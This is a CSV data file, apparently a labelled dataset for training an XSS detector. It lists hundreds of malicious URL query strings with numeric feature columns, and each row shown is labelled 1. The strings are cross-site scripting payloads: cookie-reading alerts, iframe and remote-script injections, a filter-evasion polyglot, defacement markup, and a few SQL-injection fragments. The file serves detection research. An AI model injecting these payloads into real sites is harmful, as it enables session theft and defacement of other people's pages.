url,len,url_count,evil_char,evil_word,shang,label,,,,,,,,
"msg=""><script>alert(""lol"")</script>",-0.517718128,0,1,1,-0.18952485,1,,,,,,,,
"flag1=1&querytext=""><img+src=""http://i55.tinypic.com/witu7d.png""+height=""650""+width=""1000""> ",0.63577695,1,1.444444444,0.666666667,1.060438357,1,,,,,,,,
search=<script>alert('XSS')</script>,-0.497481372,0,0.777777778,1,-0.154982142,1,,,,,,,,
"q=""><iframe src=""http://xssed.com"">",-0.517718128,1,0.888888889,0.666666667,0.317975381,1,,,,,,,,
p=galeri&gall=1&gal_cat=<script>alert(0)</script>,-0.234403547,0,0.555555556,1,-0.125928438,1,,,,,,,,
vendor_search_str=<script>alert(document.cookie)</script>&vendor_search.x=0&vendor_search.y=0,0.656013705,0,0.555555556,1,0.475662458,1,,,,,,,,
"error=<iframe src=""http://xssed.com"">",-0.477244616,1,0.666666667,0.666666667,0.092062629,1,,,,,,,,
iframe=lightsinger.org/jaihind.html,-0.517718128,0,0.111111111,0,-0.343576248,1,,,,,,,,
cont=http://www.google.com.ar' onload='alert(1337);'>,-0.153456524,1,0.666666667,1,0.533078798,1,,,,,,,,
where=<script>alert(document.cookie)</script>&type=ADDRESS_SEARCH&sent=true,0.291752102,0,0.555555556,1,0.905538205,1,,,,,,,,
search=<script>alert(document.cookie)</script>,-0.295113814,0,0.555555556,1,0.100355836,1,,,,,,,,
"szo=""><iframe+src=""http://xssed.com"">&csat=0",-0.335587326,1,0.888888889,0.333333333,0.390026944,1,,,,,,,,
"prd=secret&coupon=SPECIAL25OFF""><script>alert(document.cookie)</script>",0.210805079,0,0.777777778,1,0.953393238,1,,,,,,,,
"msg=<iframe src=""http://xssed.com"">",-0.517718128,1,0.666666667,0.666666667,0.260632306,1,,,,,,,,
"type=All&txtSearch=<iframe+src=""http://xssed.com"">&btnSearch=search",0.129858056,1,0.666666667,0.333333333,0.543165769,1,,,,,,,,
"id='</SCRIPT><script type=""text/javascript"">javascript:alert('AKIRA');javascript:alert(document.cookie);javascript:alert('Hacked');</script>",1.607141225,0,1.777777778,3.666666667,1.049498776,1,,,,,,,,
"Search=""><script>alert(document.cookie)</script>",-0.254640303,0,0.777777778,1,0.283827987,1,,,,,,,,
"search=""><script>alert(document.cookie)</script>",-0.254640303,0,0.777777778,1,0.191314924,1,,,,,,,,
error=<script>alert(document.cookie)</script>,-0.31535057,0,0.555555556,1,-0.081445798,1,,,,,,,,
txtsearchParamTxt=<script>alert(document.cookie)</script>&txtsearchParamCat=ALL&btnSearch.x=0&btnSearch.y=0&txtsearchParamType=ALL&iLevel=1&txtsearchParamMan=ALL&txtsearchParamVen=ALL&txtFromSearch=fromSearch,2.983240616,0,0.555555556,1,0.701276332,1,,,,,,,,
"s=""><script>alert(document.cookie)</script>",-0.355824082,0,0.777777778,1,0.152341286,1,,,,,,,,
"category=""><script>alert('XSS');</script>&pagina=&acc_modelo=COU",0.069147789,0,1,1,0.837406061,1,,,,,,,,
"pais=""><script>alert('XSS');</script>&nlic=99999999 or 7=2",-0.052272746,0,1,1.666666667,0.429377699,1,,,,,,,,
"pais=""><script>alert('XSS');</script>&nlic=99999999 or 7=2",-0.052272746,0,1,1.666666667,0.429377699,1,,,,,,,,
q=<script>alert(/xssed/)</script>&z=<script>alert(/xssed/)</script>,0.129858056,0,1.555555556,2,-0.18557318,1,,,,,,,,
"offset=0&frm_module=""><script>alert(document.cookie)</script>",0.008437522,0,0.777777778,1,0.496216757,1,,,,,,,,
q=<script>alert(/xssed/)</script>&z=<script>alert(/xssed/)</script>,0.129858056,0,1.555555556,2,-0.18557318,1,,,,,,,,
q=<script>alert(/xssed/)</script>&z=<script>alert(/xssed/)</script>,0.129858056,0,1.555555556,2,-0.18557318,1,,,,,,,,
q=<script>alert(/xssed/)</script>&z=<script>alert(/xssed/)</script>,0.129858056,0,1.555555556,2,-0.18557318,1,,,,,,,,
q=<script>alert(/xssed/)</script>&z=<script>alert(/xssed/)</script>,0.129858056,0,1.555555556,2,-0.18557318,1,,,,,,,,
q=<script>alert(/xssed/)</script>&z=<script>alert(/xssed/)</script>,0.129858056,0,1.555555556,2,-0.18557318,1,,,,,,,,
query=<script>alert(document.cookie)</script>&SOK.x=0&SOK.y=0,0.008437522,0,0.555555556,1,0.855165269,1,,,,,,,,
q=<script>alert(/xssed/)</script>&z=<script>alert(/xssed/)</script>,0.129858056,0,1.555555556,2,-0.18557318,1,,,,,,,,
q=<script>alert(/xssed/)</script>&z=<script>alert(/xssed/)</script>,0.129858056,0,1.555555556,2,-0.18557318,1,,,,,,,,
"count=20&news='><SCript>alert(String.fromCharCode(109,111,100,97,107,97,98,97,109))</scrIpt><foo",0.716723973,0,1.777777778,1,1.065840066,1,,,,,,,,
"query=""><SCRIPT>alert(0)</script>",-0.558191639,0,0.777777778,1,0.598396929,1,,,,,,,,
"searchtype=Article&r=(FullCategory:""/Cities/montreal""  OR FullCategory:""/Blog/montreal"")&q=asd""/><script>alert(document.cookie);</script>",1.546430958,0,1.777777778,2,0.985871532,1,,,,,,,,
"rif=132&anno=2010&nome=""><script>alert(document.cookie);</script>&cognome=xssed&code=2587&comu=015146&code_sede=MID01",1.141695843,0,0.777777778,1,1.109242528,1,,,,,,,,
"search=</title><script>alert(""XSSed"");</script>",-0.274877059,0,1.111111111,1,0.004554483,1,,,,,,,,
ShowPic=bilder/SciFiWorld_GBG2011_Big.jpg'><script>alert(document.cookie)</script>,0.433409392,0,0.888888889,1,1.158039458,1,,,,,,,,
"keyword=""><scipt>alert('xss');</scipt>",-0.45700786,0,1,0.333333333,0.347458166,1,,,,,,,,
"menu=><script>alert(document.cookie)</script><script>alert(""XSS"")</script>",0.271515346,0,1.444444444,2,0.309539332,1,,,,,,,,
"cast=&program=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",3.732000578,0,3.888888889,2.666666667,1.082446779,1,,,,,,,,
"cast=privat&objednat=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",3.873657868,0,3.888888889,2.666666667,1.169895766,1,,,,,,,,
"gab=><script>alert(document.cookie)</script><script>alert(""XSS"")</script>bySony",0.372699125,0,1.444444444,2,0.54169273,1,,,,,,,,
"domain=""><script>alert(/MasTer/)</script>.com&puny=a.co",-0.112983013,0,1,1,0.513362012,1,,,,,,,,
"s_action=error&s_error=""><script>alert(/MasTer/)</script>",-0.072509501,0,1,1,-0.126237147,1,,,,,,,,
"forum=""><script>alert(/MasTer/)</script>",-0.416534349,0,1,1,0.085483396,1,,,,,,,,
"brand=""><script>alert('xss')</script>",-0.477244616,0,1,1,-0.01207362,1,,,,,,,,
"category=""><script>alert('xss')</script>",-0.416534349,0,1,1,-0.030597582,1,,,,,,,,
"name=""><SCRIPT>alert(""XSS"")</SCRIPT>",-0.497481372,0,1,1,0.057919089,1,,,,,,,,
"i=83/1/0&name=WCRTaaa""><script>alert('xss')</script>",-0.17369328,0,1.222222222,1,0.696659458,1,,,,,,,,
"category=""><SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>",-0.03203599,1,1.111111111,1.333333333,0.759644405,1,,,,,,,,
"offset=0&search=""><script>alert(/xss/)</script>",-0.274877059,0,1,1,0.033869031,1,,,,,,,,
"mots_cles=<script>alert(""ma3str0-dz"")</script>",-0.295113814,0,0.777777778,1,0.237022371,1,,,,,,,,
cmd=playerGradeList&item_code=<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,0.352462369,1,0.888888889,1.333333333,1.181158098,1,,,,,,,,
"start=0&sort=&sortOrder=""></SCRIPT><SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>",0.453646148,1,1.444444444,1.666666667,0.724655707,1,,,,,,,,
text=<script>alert(45484555555555)</script>,-0.355824082,0,0.555555556,1,-0.59023772,1,,,,,,,,
"pointer=1>""><ScRiPt >alert(""by Ma3sTr0-Dz"");</ScRiPt>.",-0.133219768,0,1.111111111,1.666666667,1.12022585,1,,,,,,,,
"eposta=1>""><ScRiPt >alert(420806203431);</ScRiPt>.",-0.214166791,0,0.888888889,1.333333333,0.879445297,1,,,,,,,,
"feed=http://rss.wikio.it/search/""><script>alert(123)</script>.rss&lang=it&email=""><script>alert(123)</script>&Submit=OK",1.182169355,1,2,2,0.827720086,1,,,,,,,,
"q=""><script>alert(document.cookie)</script>",-0.355824082,0,0.777777778,1,0.255611682,1,,,,,,,,
searchKeys=<script>alert(3414208)</script>&lang=tr&arastir=Arastır,0.1096213,0,0.555555556,1,0.377158802,1,,,,,,,,
hash=6608997a73aaf34e019e0f075be8f635&id=1,-0.376060837,0,0,0,-0.175965242,1,,,,,,,,
"return=""><script>alert(document.cookie)</script><p """,-0.17369328,0,1,1.333333333,0.212788023,1,,,,,,,,
"search=""/><script>alert(/Xssed:+Vinaag/)</script>&x=24&y=16",-0.03203599,0,1.111111111,1,0.79093311,1,,,,,,,,
methodName=<script>alert(document.cookie)</script>,-0.214166791,0,0.555555556,1,0.211178402,1,,,,,,,,
"shoph=50680""><script>alert(document.cookie)</script>",-0.17369328,0,0.777777778,1,0.599162325,1,,,,,,,,
"requete=""><script>alert(document.cookie)</script>",-0.234403547,0,0.777777778,1,0.124399018,1,,,,,,,,
"searchKeywords=<script>alert(""Gh0stSniper+Contact+me!+2words4uready[at]live[dot]com"")</script>&dateRange=60",0.939328286,0,0.777777778,1,1.119067134,1,,,,,,,,
"requestkey=""><iframe src=""http://www.bildirgec.org/imaj/arseli33/hacked.gif"" name=""zone1"" height=""1000"" width=""1000"">     Cadres local </iframe>",1.688088248,1,2.222222222,4,0.978993284,1,,,,,,,,
"shoph=50084""><script>alert(document.cookie)</script>",-0.17369328,0,0.777777778,1,0.599162325,1,,,,,,,,
"t=k&sstr=""><script>alert(document.cookies)</script>&c=0&q=all&o=d&f0=1&a0=1&v=1",0.372699125,0,0.777777778,1,0.53629258,1,,,,,,,,
"uyeid=3087+and+1=2&rumuz=fuykca""><script>alert(""Hacked ByDark.Man"")</script><marquee><h1>Hacked by Dark.Man</h1></marquee>",1.242879622,0,2.111111111,2,1.268726189,1,,,,,,,,
"columnID=5""><script>alert(document.cookie)</script><marquee><h1>Hacked By Dark.Man</h1></marquee>",0.736960728,0,1.888888889,1.666666667,0.926836118,1,,,,,,,,
"catecode=1001002000""><script>alert(document.cookie)</script><marquee><h1>hacked By Dark.Man</h1></marquee>",0.91909153,0,1.888888889,1.666666667,0.789004323,1,,,,,,,,
u=kiktsz4wuq5c6&lng=<script>alert(/xss/)</script>,-0.234403547,0,0.777777778,1,0.54398501,1,,,,,,,,
u=kiktsz4wuq5c6&lng=<script>alert(/xss/)</script>,-0.234403547,0,0.777777778,1,0.54398501,1,,,,,,,,
"id=<script>alert(""Milisx"")</script>",-0.517718128,0,0.777777778,1,-0.251467182,1,,,,,,,,
u=kiktsz4wuq5c6&lng=<script>alert(/xss/)</script>,-0.234403547,0,0.777777778,1,0.54398501,1,,,,,,,,
s=<script>alert(document.cookie)</script>&submit=Sök,-0.17369328,0,0.555555556,1,0.433477397,1,,,,,,,,
AWA_start_265=17a78839b2e4e5abee804348b9cb73e5&valg=sok&sok_str=</title><script>alert(1)</script>,0.736960728,0,0.888888889,1,1.060206297,1,,,,,,,,
"tk=209816263&pk=""</script><script>alert(1)</script>",-0.193930036,0,1,1.333333333,0.364991502,1,,,,,,,,
go=1</textarea><ScRiPt >alert('z0ne-xss3d-mdz');</ScRiPt>&originator=lmenu,0.271515346,0,1.111111111,1.333333333,1.052670128,1,,,,,,,,
"search=<script>alert(""XSS+by+UeCr3w"")</script>",-0.295113814,0,0.777777778,1,0.494401361,1,,,,,,,,
page=1</title>1<ScRiPt >prompt(/XSS byUeCr3w/)</ScRiPt>y UeCr3w/)</ScRiPt>,0.271515346,0,1.555555556,2.333333333,0.681940939,1,,,,,,,,
"q=""><script>alert('Hacked By NoTTy')</script>",-0.31535057,0,1,1.666666667,0.679558219,1,,,,,,,,
"next=detail&ivanr=""><script>alert(123)</script>",-0.274877059,0,0.777777778,1,0.262109193,1,,,,,,,,
"collection=""><script>alert(""XSS byTimse"")</script>",-0.214166791,0,1,1.333333333,0.370906249,1,,,,,,,,
"q=""><script>alert(123)</script>",-0.598665151,0,0.777777778,1,-0.051098575,1,,,,,,,,
page=9&searchword=<script>alert(document.cookie)</script>&imageField.x=0&imageField.y=0,0.534593171,0,0.555555556,1,0.714551793,1,,,,,,,,
"q=""><script>alert(""XSS+by+UeCr3w"")</script>",-0.355824082,0,1,1,0.537124969,1,,,,,,,,
q=<script>alert(document.cookie);</script>,-0.376060837,0,0.555555556,1,0.265765853,1,,,,,,,,
"linkid=""><script>alert(1)</script>&placeid=99",-0.31535057,0,0.777777778,1,0.137977848,1,,,,,,,,
"term=<iframe src=""http://xssed.com"">",-0.497481372,1,0.666666667,0.666666667,0.135619243,1,,,,,,,,
"a=preview&first=zur&last= XSS-Luecke""><script>alert(document.cookies)</script>&filename=Koala.jpg&page=1&birthday=12.06.2011'&artikel1=",1.505957447,0,0.888888889,1.333333333,1.288159889,1,,,,,,,,
"ymd=20100509&content_id=""><script>alert(document.cookie)</script>",0.089384545,0,0.777777778,1,0.746664787,1,,,,,,,,
"action=view&lim=150&id=194&typuser=5&type_field=typuser&order=deleted&find=&table=user&ukey=""><script>alert(/w00t/)</script>",1.283353133,0,1,1,0.717043416,1,,,,,,,,
"""></a>--><script>alert(1337)</script><!--",-0.396297593,0,1.333333333,1,-0.148986997,1,,,,,,,,
"m=products&ara=""><script>alert(document.cookie)</script>",-0.092746257,0,0.777777778,1,0.243983599,1,,,,,,,,
"searchfield=""><script>alert(404)</script>",-0.396297593,0,0.777777778,1,0.0314717,1,,,,,,,,
"q=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>&submit=reSearch",3.812947601,0,3.888888889,2.666666667,1.144825303,1,,,,,,,,
"lgnUrl='""--></style></script><script>alert('XSS')</script>",-0.052272746,0,1.777777778,1.333333333,0.204987955,1,,,,,,,,
_dyncharset=ISO-8859-1&_dynSessConf=4920840742597379144&/com/cbi/search/PaylessSearchFormHandler.question=<script>alert(document.cookie)</script>&_D:/com/cbi/search/PaylessSearchFormHandler.question=+&/com/cbi/search/PaylessSearchFormHandler.search.x=0&/com/cbi/search/PaylessSearchFormHandler.search.y=0&_D:/com/cbi/search/PaylessSearchFormHandler.search=+&_DARGS=/store/search/includes/searchboxslot.jsp,6.969881497,0,3.222222222,1,1.226477676,1,,,,,,,,
"sKey=A&nCnt=0&auth=1&nSeq=</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>&searchArea=A&action=index_main&body=searchng.fromCharCode(88,83,83))</SCRIPT>&searchArea=A&action=index_main&body=search",3.084424394,0,2.111111111,1.666666667,1.46148735,1,,,,,,,,
"T=M&C=1785227059-->""></script><script>alert(document.cookie)</script>&",0.190568323,0,1.222222222,1.333333333,1.064431652,1,,,,,,,,
"search="">""><IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",-0.03203599,0,1.444444444,1.333333333,1.006062892,1,,,,,,,,
"tab=3-->""></script><script>alert(document.cookie)</script>&",-0.03203599,0,1.222222222,1.333333333,0.398487229,1,,,,,,,,
"comunicate&id=103-->""><script>alert(document.cookie)</script>",0.008437522,0,0.888888889,1,0.525797011,1,,,,,,,,
page=redirect&url=http://www.xssed.com,-0.45700786,1,0.222222222,0,0.145762263,1,,,,,,,,
"keyword=<script>alert(""Xss By xDarkSton3x"")</script>",-0.17369328,0,0.777777778,1.666666667,0.751663904,1,,,,,,,,
"id=""><script>alert(/MasTer/)</script>",-0.477244616,0,1,1,-0.197864063,1,,,,,,,,
"Submit=Get Pagerank&url=""><iframe src=http://xssed.com>",-0.112983013,1,0.666666667,1,0.931422611,1,,,,,,,,
"dir=/I_Phone&p=""><script>alert(/MasTer/)</script>",-0.234403547,0,1.111111111,1,0.428527118,1,,,,,,,,
"initid=177&heading=""><script>alert(/MasTer/)</script>",-0.153456524,0,1,1,0.350598573,1,,,,,,,,
"AgentID=""><script>alert(/MasTer/)</script>",-0.376060837,0,1,1,0.189008298,1,,,,,,,,
"q=""><script>alert(404)</script>",-0.598665151,0,0.777777778,1,-0.155092681,1,,,,,,,,
"id=41""><script>alert(document.cookie)</script>",-0.295113814,0,0.777777778,1,0.340556611,1,,,,,,,,
"id=/events.htm&l=en&p=5&s=1""><script>alert(document.cookie)</script>",0.150094812,0,0.888888889,1,0.582736157,1,,,,,,,,
"category=outreach-pstsp""><script>alert(document.cookie)</script>",0.069147789,0,0.777777778,1,0.270562328,1,,,,,,,,
ip=<iframe src=http://xssed.com>&lang=English,-0.31535057,1,0.444444444,0.666666667,0.59035788,1,,,,,,,,
q=</title><script>alert('xss')</script>&submit=Cerca+>&as_sitesearch=http://www10.gencat.net/agaur_web&site=default_collection&idioma=,1.485720691,1,1.555555556,1,0.84405696,1,,,,,,,,
"s=""><script>alert(document.cookie);</script>",-0.335587326,0,0.777777778,1,0.247148294,1,,,,,,,,
"vo=\""><script>alert('xss');</script>",-0.497481372,0,1,1,0.113669301,1,,,,,,,,
"dAmbito=21&busqueda=""><script>alert(document.cookie)</script>",0.008437522,0,0.777777778,1,0.686984322,1,,,,,,,,
"interest=data2""><script>alert(document.cookie);</script><asdf a=""",0.089384545,0,1,1.333333333,0.405650633,1,,,,,,,,
"key=""><script>alert('Sandeepl337')</script>",-0.355824082,0,1,1,0.358882077,1,,,,,,,,
"interest=data2""><script>alert(document.cookie);</script><asdf a=""",0.089384545,0,1,1.333333333,0.405650633,1,,,,,,,,
"ftQtype=sfi&ftAl=EI&ftFn=""><script>alert(document.cookie);</script><asdf a=""",0.311988858,0,1,1.333333333,0.875158555,1,,,,,,,,
"LoginURL=""'><script>alert(document.cookie);</script><",-0.153456524,0,1,1,0.662781561,1,,,,,,,,
"s=""><script>alert(document.cookie)</script>&s-btn=",-0.214166791,0,0.777777778,1,0.407826921,1,,,,,,,,
"cat=""><script>alert(""Virtual_SystEm"")</script>.",-0.274877059,0,1,1,0.187865468,1,,,,,,,,
"cat=""><script>alert(""Virtual_SystEm"")</script>.",-0.274877059,0,1,1,0.187865468,1,,,,,,,,
"cat=""><script>alert(""Virtual_SystEm"")</script>.",-0.274877059,0,1,1,0.187865468,1,,,,,,,,
"cat=clamshell&pn=""><script>alert(""Virtual_SystEm"")</script>.",-0.011799234,0,1,1,0.432112808,1,,,,,,,,
"cat=10&item=""><script>alert(""Virtual_SystEm"")</script>.",-0.112983013,0,1,1,0.450594012,1,,,,,,,,
langId=-1&storeId=500201&catalogId=500201&term=<SCRIPT+SRC=http://ha.ckers.org/xss.js></SCRIPT>&x=0&y=0&N=0&action=products,1.263116378,1,0.888888889,1,1.301920366,1,,,,,,,,
busca=<script>alert(document.cookie)</script>,-0.31535057,0,0.555555556,1,0.165018063,1,,,,,,,,
"palavra=Brenn0""><script>alert(document.cookie)</script>&busca_tipo=1&x=0&y=0&buscaselect=0&Atividade_ID=0&Unidade_ID=0",1.161932599,0,0.777777778,1,0.965838474,1,,,,,,,,
"cinecode=""/><script>alert('we suck');</script>xxxx12|11&categ=11""/><input>xxxx",0.352462369,0,1.666666667,1.333333333,0.675589283,1,,,,,,,,
"page=html&id=34""><script>alert(document.cookie)</script><img src=http://vuln.xssed.net/thirdparty/scripts/xssed.gif />",1.161932599,1,1.666666667,2.333333333,0.808926748,1,,,,,,,,
"page=termekek&cat=1""><script>alert(document.cookie)</script>",-0.011799234,0,0.777777778,1,0.293454828,1,,,,,,,,
"page=html&id=53""><script>alert(document.cookie)</script><img src=http://vuln.xssed.net/thirdparty/scripts/xssed.gif />",1.161932599,1,1.666666667,2.333333333,0.808926748,1,,,,,,,,
"nom=""/><iframe+src=""http://xssed.com"">&Rech_excl=non&affiche=complete&type_form=0&chercher=Chercher&cherchersubmit=Chercher",1.263116378,1,1,0.333333333,0.419990156,1,,,,,,,,
"u=""><script>alert(document.cookie)</script>",-0.355824082,0,0.777777778,1,0.180639186,1,,,,,,,,
mjSID=2fnm65rqu3h338tpv1k2gvoik5&keywords=<script>alert(1)</script>,0.129858056,0,0.555555556,1,1.429829879,1,,,,,,,,
"d=1&id=13&c_old=5""></form><img src=http://vuln.xssed.net/thirdparty/scripts/xssed.gif><script>alert(document.cookie)</script>&what=c&page=1",1.58690447,1,1.888888889,2,1.008742449,1,,,,,,,,
keyword=<Script>alert(/Xssed byp0pc0rn/)</script>,-0.234403547,0,0.777777778,1.333333333,0.453359969,1,,,,,,,,
"k=""><script>alert(document.cookie);</script>",-0.335587326,0,0.777777778,1,0.274803059,1,,,,,,,,
"page=90&kode=6&ktg=XSSED</h3><iframe width=""625"" height=""800"" src=""http://www.spyrozone.net""></iframe><br><br><h3 class=""judulcob"">Link: Lain-Lain",1.72856176,1,2.666666667,2,1.620527688,1,,,,,,,,
"p=gvalhey&q=u are gay 8D""<script>alert(/xssed.com/)</script>",-0.011799234,0,0.888888889,2,0.871748214,1,,,,,,,,
"REF=/Articles/Alist/RFIDSystem-1.htm&Title=Securitylab</title>1""/><script>alert(/securitylab.ir/)</script>",0.91909153,0,1.777777778,1,0.634674948,1,,,,,,,,
"f_email="" ""/><script>alert(/securitylab.ir/)</script>bad=""&f_user=&lid=bg&six=&tid=clean",0.554829927,0,1.333333333,1.333333333,0.594649197,1,,,,,,,,
"history=1&Page=test""></a><iframe src=""http://xssed.com"">//",-0.052272746,1,1.444444444,0.666666667,0.482903241,1,,,,,,,,
"func=find-a&find_code=WAU&request=asdf""/><script>alert(1);</script>",0.129858056,0,0.888888889,1,0.764966348,1,,,,,,,,
q=<script>alert(/XSS/.source)</script>,-0.45700786,0,0.777777778,1,0.028903657,1,,,,,,,,
search=<script>alert(/XSS/.source)</script><marquee><h1>XSS by Msk</h1>,0.210805079,0,1.555555556,1.666666667,0.590146216,1,,,,,,,,
"freeText=sarette""><iframe+src=""http://xssed.com"">",-0.234403547,1,0.888888889,0.333333333,0.037818653,1,,,,,,,,
dbname=<script>alert(/Xssed/)</script>&docid=<script>alert(/Xssed/)</script>,0.311988858,0,1.555555556,2,-0.006805939,1,,,,,,,,
"file=""><script>alert(""XSS by Yeyah =)"")</script>",-0.254640303,0,1,2,0.43796979,1,,,,,,,,
id=2&sect_id=<script>alert(/Xssed/)</script> &lvl2=1,-0.17369328,0,0.777777778,1.333333333,0.215883677,1,,,,,,,,
map=<script>alert(/Xssed/)</script>,-0.517718128,0,0.777777778,1,-0.304210999,1,,,,,,,,
reserve-mode=active&rel=de&content-id=1173717757720&search=<script>alert(document.cookie)</script>,0.757197484,0,0.555555556,1,0.635037645,1,,,,,,,,
"username=""/><script>alert(1);</script>",-0.45700786,0,0.888888889,1,0.028903657,1,,,,,,,,
A0028&amp<script>alert(' back to the futuer! ');</script>,-0.072509501,0,0.777777778,2.666666667,0.700057799,1,,,,,,,,
"domain=<body onload=""alert(1)"">",-0.598665151,0,0.444444444,1,-0.115840756,1,,,,,,,,
"lang=""<script>alert(1);</script>",-0.578428395,0,0.666666667,1,-0.000558356,1,,,,,,,,
"tpl=131&filmid=454241&prefix=""><script>alert(document.cookie)</script>",0.190568323,0,0.777777778,1,0.810086707,1,,,,,,,,
file=<script>alert(document.cookie)</script>,-0.335587326,0,0.555555556,1,0.137961631,1,,,,,,,,
file=<script>alert(document.cookie)</script>,-0.335587326,0,0.555555556,1,0.137961631,1,,,,,,,,
"lang=en""><iframe/src=""http://xssed.com"">&origin=MOW",-0.193930036,1,1,0.333333333,0.723561466,1,,,,,,,,
"basket_id=""><script>alert(document.cookie)</script>&redirect=7068702e70696873643273",0.453646148,0,0.777777778,1,0.934836225,1,,,,,,,,
"show=bezugsquellen&lng=en""></a></span></td></tr></table><iframe src=http://xssed.com></iframe><script>alert(document.cookie)</script>",1.465483935,1,3.222222222,1.666666667,0.74046276,1,,,,,,,,
action=find&find=<script>alert(document.cookie)</script>,-0.092746257,0,0.555555556,1,0.196908037,1,,,,,,,,
q=<script>alert(1)</script>,-0.679612174,0,0.555555556,1,-0.394815679,1,,,,,,,,
"nats=NTE3Mzo0OjE1,0,0,0,0""><script>alert(document.cookie)</script>",0.1096213,0,1.222222222,1,0.989793544,1,,,,,,,,
file=<script>alert(document.cookie)</script>,-0.335587326,0,0.555555556,1,0.137961631,1,,,,,,,,
"q=sex""><SCRIPT>alert(String.fromCharCode(104,97,99,107,101,100,32,98,121,32,104,101,120,105,107,46,99,122))</SCRIPT>&order=t.activation_date&f_submit=",1.809508783,0,2.666666667,1,1.353029476,1,,,,,,,,
q=<script>alert(document.cookie)</script>,-0.396297593,0,0.555555556,1,0.169457961,1,,,,,,,,
"userSearch=1&searchbox='""--><script>alert(/woo7/)</script>&section=187",0.190568323,0,1.111111111,1,0.707283929,1,,,,,,,,
searchtype=t&searcharg=<script>alert(document.cookie)</script>&SORT=D&extended=0&SUBMIT=Search&searchlimits=&searchorigarg=t<script>alert('test')</script>,1.890455806,0,1.333333333,2,0.760802295,1,,,,,,,,
"id=<script>alert(""Stupid-HaCker"")</script>",-0.376060837,0,0.777777778,1,0.199165721,1,,,,,,,,
"q=</script><script>alert(document.cookie);</script></html><html><iframe src=""http://xssed.com""></iframe></html>&output=xml_no_dtd&client=depts&proxystylesheet=ogcio_home_adv_frontend&1298556130579=sessionid&gp1=budget_home&gp0=budget_home&web=this&tpl_id=stdsearch&ui_lang=zh-hk&oe=UTF-8&ie=UTF-8&sort=date:D:L:d1&entqr=3&entsp=a&ud=1&site=budget_home&filter=0&site=default_collection",6.544909626,1,2.777777778,2,1.35015207,1,,,,,,,,
"node_id=12&type_id=&studyMode=&keyword=<iframe+src=""http://xssed.com"">",0.190568323,1,0.666666667,0.333333333,0.760768993,1,,,,,,,,
showOption=false&term=<script>alert(1)</script>,-0.274877059,0,0.555555556,1,0.262109193,1,,,,,,,,
"url=""></script><script>alert(12)</script>",-0.396297593,0,1.111111111,1.333333333,-0.316651543,1,,,,,,,,
q=<script>alert(/xssed/)</script>&z=<script>alert(/xssed/)</script>,0.129858056,0,1.555555556,2,-0.18557318,1,,,,,,,,
q=<script>alert(/xssed/)</script>&z=<script>alert(/xssed/)</script>,0.129858056,0,1.555555556,2,-0.18557318,1,,,,,,,,
q=<script>alert(/xssed/)</script>&z=<script>alert(/xssed/)</script>,0.129858056,0,1.555555556,2,-0.18557318,1,,,,,,,,
q=<script>alert(/xssed/)</script>&z=<script>alert(/xssed/)</script>,0.129858056,0,1.555555556,2,-0.18557318,1,,,,,,,,
q=<script>alert(/xssed/)</script>&z=<script>alert(/xssed/)</script>,0.129858056,0,1.555555556,2,-0.18557318,1,,,,,,,,
q=<script>alert(/xssed/)</script>&z=<script>alert(/xssed/)</script>,0.129858056,0,1.555555556,2,-0.18557318,1,,,,,,,,
q=<script>alert(/xssed/)</script>&z=<script>alert(/xssed/)</script>,0.129858056,0,1.555555556,2,-0.18557318,1,,,,,,,,
q=<script>alert(/xssed/)</script>&z=<script>alert(/xssed/)</script>,0.129858056,0,1.555555556,2,-0.18557318,1,,,,,,,,
"page=2&News=<iframe src=""http://xssed.com""></iframe> <script>alert(""XSS"")</script>&langid=en",0.63577695,1,1.777777778,2,0.897440507,1,,,,,,,,
